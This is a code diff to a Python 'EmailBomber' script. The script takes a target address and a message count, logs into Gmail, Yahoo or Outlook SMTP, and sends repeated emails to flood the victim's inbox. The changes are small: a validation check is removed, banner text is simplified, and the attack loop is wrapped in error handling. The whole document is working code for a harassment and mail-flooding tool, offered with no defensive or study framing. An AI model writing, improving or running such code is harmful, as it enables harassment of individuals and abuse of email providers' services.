@@ -10,17 +10,12 @@ class EmailBomber:
             self.target = str(input('Enter target email: '))
             self.amount = int(input('Enter number of emails: '))
 
-            if self.mode < int(1):
-                print("ERROR: invalid number")
-                sys.exit(1)
         except Exception as e:
             print(f'Error: {e}')
 
-
-
     def email(self):
         try:
-            print('\n+[+[+[ Setting up email ]+]+]+')
+            print('\n Setting up email ')
             self.server = str(input('Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
             premade = ['1', '2', '3']
             default_port = True
@@ -51,6 +46,7 @@ class EmailBomber:
             self.s.starttls()
             self.s.ehlo()
             self.s.login(self.fromAddr, self.fromPwd)
+
         except Exception as e:
             print(f'ERROR: {e}')
 
@@ -64,12 +60,19 @@ class EmailBomber:
 
 
     def attack(self):
-        print('\n+[+[+[ Attacking... ]+]+]+')
-        for email in range(self.amount+1):
-            self.send()
-        self.s.close()
-        print('\n+[+[+[ Attack finished ]+]+]+')
-        sys.exit(0)
+        try:
+
+            print('\n Attacking... ')
+
+            for email in range(self.amount+1):
+                self.send()
+                
+            self.s.close()
+            print('\n Attack finished ')
+            sys.exit(0)
+        except Exception as e:
+            print(f'ERROR: {e}')
+        
 
 if __name__=='__main__':
     bomb = EmailBomber()
